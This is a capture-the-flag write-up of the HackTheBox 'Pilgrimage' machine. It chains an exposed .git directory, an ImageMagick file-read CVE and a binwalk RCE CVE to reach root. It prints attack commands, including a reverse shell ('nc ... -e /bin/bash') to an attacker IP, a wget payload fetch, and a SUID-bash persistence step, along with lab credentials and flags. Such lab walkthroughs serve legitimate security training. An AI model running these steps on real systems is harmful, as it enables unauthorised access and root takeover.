# HackTheBox — Pilgrimage

![OS: Linux](https://img.shields.io/badge/OS-Linux-blue)
![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![Tags: web, lfi, cve, binwalk](https://img.shields.io/badge/Tags-web%20%7C%20LFI%20%7C%20CVE%20%7C%20binwalk-orange)

> **TL;DR** — Discover an exposed `.git` directory, dump the source, and find an image-shrinking app powered by ImageMagick. Exploit **CVE-2022-44268** to read the SQLite DB, recover `emily`'s credentials, then escalate to root via **CVE-2022-4510** in `binwalk`, which is invoked by a privileged `malwarescan.sh` cron-style watcher.

---

## Table of Contents

- [Reconnaissance](#reconnaissance)
- [Web Enumeration](#web-enumeration)
- [Source Code Review](#source-code-review)
- [Initial Foothold — CVE-2022-44268](#initial-foothold--cve-2022-44268)
- [User Flag](#user-flag)
- [Privilege Escalation — CVE-2022-4510](#privilege-escalation--cve-2022-4510)
- [Root Flag](#root-flag)
- [Lessons Learned](#lessons-learned)

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -p- -oN nmap.txt 10.129.179.170
```

<details>
<summary>Click to expand full output</summary>

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

</details>

**Findings:**

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 8.4p1 (Debian) |
| 80   | HTTP    | nginx 1.18.0 |

The HTTP server redirects to `pilgrimage.htb`, so add it to `/etc/hosts`:

```bash
echo "10.129.179.170 pilgrimage.htb" | sudo tee -a /etc/hosts
```

---

## Web Enumeration

The site (`http://pilgrimage.htb`) hosts an **image shrinker** with optional user authentication. Time to look for hidden paths.

### Directory Brute-Force

```bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://pilgrimage.htb/
```

The interesting hit: a `.git/HEAD` reference indicating an **exposed git repository**.

> 💡 **Tip:** The Firefox extension [**dotGit**](https://addons.mozilla.org/en-US/firefox/addon/dotgit/) automatically detects exposed `.git` directories on sites you visit — credit to *ziadaligom3a2* on the official forum.

Confirming the leak:

```bash
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://pilgrimage.htb/.git/
```

```
/branches             (Status: 301)
/config               (Status: 200)
/description          (Status: 200)
/hooks                (Status: 301)
/index                (Status: 200)
/info                 (Status: 301)
/logs                 (Status: 301)
/objects              (Status: 301)
/refs                 (Status: 301)
```

### Dumping the Repository

Rather than brute-forcing every object, dump the whole repo with [`git-dumper`](https://github.com/arthaud/git-dumper):

```bash
git-dumper http://pilgrimage.htb/.git ~/pilgrimage.htb/
```

Then inspect history visually with [GitKraken](https://www.gitkraken.com/) — or use `git log -p` if you prefer the terminal.

---

## Source Code Review

Three takeaways from reading the source:

1. **A user named `emily`** appears in commit history.
2. **`index.php`** calls a binary named `magick` via `exec()` to process uploaded images.
3. **`dashboard.php`** references a SQLite database at **`/var/db/pilgrimage`**.

I burned some time confirming the app was *not* vulnerable to:

- ❌ SQL injection (tested with `sqlmap`)
- ❌ SSRF (tested with `ssrfmap`)
- ❌ LFI / RFI (no user-controlled file paths)

That left the `magick` binary as the most promising attack surface.

---

## Initial Foothold — CVE-2022-44268

### The Vulnerability

[**CVE-2022-44268**](https://github.com/Sybil-Scan/imagemagick-lfi-poc) is an information-disclosure flaw in ImageMagick:

> When ImageMagick parses a PNG image (e.g., for resize), the resulting image can embed the contents of an arbitrary remote file — provided the ImageMagick process can read it.

Since the app uses `magick` to shrink uploads, we can craft a malicious PNG that smuggles a file path. After processing, the **output PNG contains the file's contents in its metadata**.

### Reading the SQLite Database

Generate a payload that targets the database file:

```bash
python3 generate.py -f "/var/db/pilgrimage" -o exploit.png
```

Upload `exploit.png` through the web app, then download the shrunk result. Extract the smuggled data with:

```bash
identify -verbose result.png
```

The `Raw profile type` field contains the hex-encoded contents of `/var/db/pilgrimage`.

> ⚠️ **Heads up:** The hex blob is huge and padded with long runs of zeros. A few approaches that work:
>
> - Pull out non-zero chunks and decode them with [CyberChef](https://gchq.github.io/CyberChef/) or [RapidTables](https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html).
> - Strip whitespace and pipe through `xxd -r -p` to reconstruct the original SQLite file, then open it with `sqlite3`.

After decoding, the `users` table reveals:

| Username | Password           |
|----------|--------------------|
| emily    | `abigchonkyboi123` |

---

## User Flag

```bash
ssh emily@pilgrimage.htb
```

```
emily@pilgrimage:~$ id
uid=1000(emily) gid=1000(emily) groups=1000(emily)

emily@pilgrimage:~$ cat user.txt
45f358764bf886c14da1c36d91045a06
```

🚩 **User flag captured.**

---

## Privilege Escalation — CVE-2022-4510

### Finding the Attack Surface

Standard privesc enumeration (`sudo -l`, SUID binaries, kernel exploits) turned up nothing useful. But buried in `/usr/sbin/` was an interesting script running as root:

```bash
cat /usr/sbin/malwarescan.sh
```

```bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
    filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
    binout="$(/usr/local/bin/binwalk -e "$filename")"
    for banned in "${blacklist[@]}"; do
        if [[ "$binout" == *"$banned"* ]]; then
            /usr/bin/rm "$filename"
            break
        fi
    done
done
```

### Reading the Script

Confirm it's actually running as root using [`pspy`](https://github.com/DominicBreuker/pspy) (download to the box via a Python HTTP server). Upload any image and watch `pspy` show the script firing.

What the script does:

1. Watches `/var/www/pilgrimage.htb/shrunk/` for newly **created** files.
2. Runs `binwalk -e` on each new file.
3. Deletes anything binwalk flags as a script/executable.

My first thought was command injection via `$filename`, but `echo` is reading the inotify event — not the filename — and `sed` strips it cleanly. The script itself isn't the vuln — **`binwalk` is**.

### The Vulnerability

[**CVE-2022-4510**](https://www.exploit-db.com/exploits/51249) — Binwalk 2.1.2b through 2.3.2 has a path-traversal RCE in its PFS extractor. A crafted image triggers code execution when binwalk tries to extract it.

### Building the Payload

Grab the [public PoC](https://www.exploit-db.com/exploits/51249), then:

```bash
touch binwalk.png
python3 binwalk.py binwalk.png 10.10.14.76 1337
```

Output:

```
################################################
------------------CVE-2022-4510-----------------
################################################
You can now rename and share binwalk_exploit and start your local netcat listener.
```

### Delivery

The exploit needs to land in `/var/www/pilgrimage.htb/shrunk/` as a **newly created file** (inotify only triggers on `create`, not on `mv`).

Two options:

**Option A — Build it on the box** (no second listener needed):

```bash
# As emily, paste the exploit into nano on the target
nano binwalk.py
touch file.png
python3 binwalk.py file.png 10.10.14.76 1337
cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/
```

**Option B — Serve it from your machine:**

```bash
# On attacker
python3 -m http.server 8080

# On target as emily
cd /var/www/pilgrimage.htb/shrunk
wget http://10.10.14.76:8080/binwalk_exploit.png
```

> ⚠️ **Gotcha:** Don't `mv` the file into `shrunk/` from another directory — that's a *move*, not a *create*, and won't trigger `inotifywait`. Use `cp` or `wget` directly into the watched folder.

### Catching the Shell

Start the listener **before** copying the payload in:

```bash
nc -lvnp 1337
```

Watching `pspy` confirms the script firing as root:

```
2023/06/26 10:29:33 CMD: UID=0  PID=2964 | /usr/bin/python3 /usr/local/bin/binwalk -e /var/www/pilgrimage.htb/shrunk/binwalk_exploit.png
2023/06/26 10:29:33 CMD: UID=0  PID=2965 | sh -c nc 10.10.14.76 1337 -e /bin/bash 2>/dev/null &
```

The listener catches a root shell:

```
connect to [10.10.14.76] from (UNKNOWN) [10.129.180.185] 42450
id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Root Flag

```bash
cat /root/root.txt
04c9c7c38d59a436b8d3ac261a10e70e
```

🚩 **Root flag captured.**

### Bonus: Persistent Root via SUID Bash

Reverse shells are fragile. Make the privilege upgrade durable from the existing SSH session:

```bash
# In the root reverse shell:
chmod +s /bin/bash

# Back in emily's SSH session:
bash -p
id
# uid=1000(emily) gid=1000(emily) euid=0(root) egid=0(root) groups=0(root),1000(emily)
```

---

## Lessons Learned

- **Always check for exposed `.git` directories.** Source code disclosure changes the whole engagement — you stop guessing and start reading.
- **Don't trust file processors.** ImageMagick, `binwalk`, `ffmpeg`, and similar tools have a long history of metadata- and parser-based CVEs. Whenever a service handles a file format, look up recent CVEs against the parser.
- **Inotify filters matter.** A privileged watcher acting on `create` events is an extremely useful sink for unprivileged users who can write to the watched directory.
- **Read the script, then read the binary.** The script wasn't directly exploitable — but a tool it called was. Always trace the entire chain.

## Tools Referenced

| Tool | Purpose |
|------|---------|
| [`nmap`](https://nmap.org/) | Port and service discovery |
| [`gobuster`](https://github.com/OJ/gobuster) | Directory brute-forcing |
| [`git-dumper`](https://github.com/arthaud/git-dumper) | Recovering exposed `.git` repos |
| [GitKraken](https://www.gitkraken.com/) | Visual git history inspection |
| [CVE-2022-44268 PoC](https://github.com/Sybil-Scan/imagemagick-lfi-poc) | ImageMagick arbitrary file read |
| [`pspy`](https://github.com/DominicBreuker/pspy) | Process monitoring without root |
| [CVE-2022-4510 PoC](https://www.exploit-db.com/exploits/51249) | Binwalk RCE |

---

*Thanks for reading — feedback welcome.*
